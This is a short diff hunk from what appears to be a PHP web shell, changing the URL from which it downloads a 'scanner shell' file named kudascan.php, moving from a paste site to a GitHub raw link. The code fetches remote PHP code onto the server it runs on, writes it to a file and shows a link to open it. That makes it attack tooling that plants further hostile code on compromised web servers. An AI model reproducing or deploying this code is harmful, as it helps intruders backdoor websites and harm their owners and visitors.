@@ -4546,7 +4546,7 @@ if (file_exists('kudascan.php')) {
     echo "<center><a href='$full/kudascan.php' target='_blank'><font color='lime'>> SCANNER SHELL <</a></font></center>";
 }
 else {
-    if (tod("https://pst.innomi.net/paste/grwchgx94p96noub23q99oov/raw", "kudascan.php")) {
+    if (tod("https://raw.githubusercontent.com/mrxbarakuda/scanner-shell/refs/heads/master/kudascan.php", "kudascan.php")) {
         echo "<center><a href='$full/kudascan.php' target='_blank'><font color='lime'>> SCANNER SHELL <</a></font></center>";
     }
     else {
